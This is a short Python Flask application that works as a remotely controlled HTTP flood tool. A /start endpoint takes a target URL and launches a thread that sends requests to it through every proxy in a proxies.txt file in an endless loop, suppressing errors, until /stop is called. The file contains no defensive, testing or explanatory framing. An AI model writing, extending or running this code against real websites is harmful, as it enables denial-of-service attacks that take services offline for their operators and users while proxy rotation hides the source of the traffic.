from flask import Flask, request, jsonify
import threading
import requests
import time

app = Flask(__name__)
running = False

def send_requests(url, proxies):
    global running
    while running:
        for proxy in proxies:
            try:
                requests.get(url, proxies={"http": proxy, "https": proxy}, timeout=3)
            except:
                pass

@app.route('/start', methods=['POST'])
def start():
    global running
    if running:
        return jsonify({"status": "Already running"})
    data = request.json
    url = data.get('url')
    with open('proxies.txt') as f:
        proxies = [line.strip() for line in f if line.strip()]
    running = True
    thread = threading.Thread(target=send_requests, args=(url, proxies))
    thread.start()
    return jsonify({"status": "Started"})

@app.route('/stop', methods=['POST'])
def stop():
    global running
    running = False
    return jsonify({"status": "Stopped"})

if __name__ == '__main__':
    app.run(port=5000)
